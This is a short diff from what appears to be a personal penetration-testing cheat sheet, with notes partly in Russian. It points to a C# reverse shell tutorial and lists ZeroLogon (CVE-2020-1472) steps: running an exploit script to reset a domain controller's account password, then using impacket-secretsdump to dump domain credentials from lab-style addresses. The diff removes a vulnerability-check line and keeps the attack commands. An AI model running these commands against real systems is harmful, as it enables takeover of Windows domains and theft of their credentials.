@@ -307,8 +307,7 @@ reverse shell c#
 https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.net\framework64\v4.0.30319> .\csc.exe ---> 
 
 # ZERO_LOGON
-
-    python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
+    
     сброс пароля DC
     python3 cve-2020-1472-exploit.py -n 'DC01$' -t 10.10.0.1
     impacket-secretsdump -just-dc -no-pass fuse\DC1$@10.10.10.193
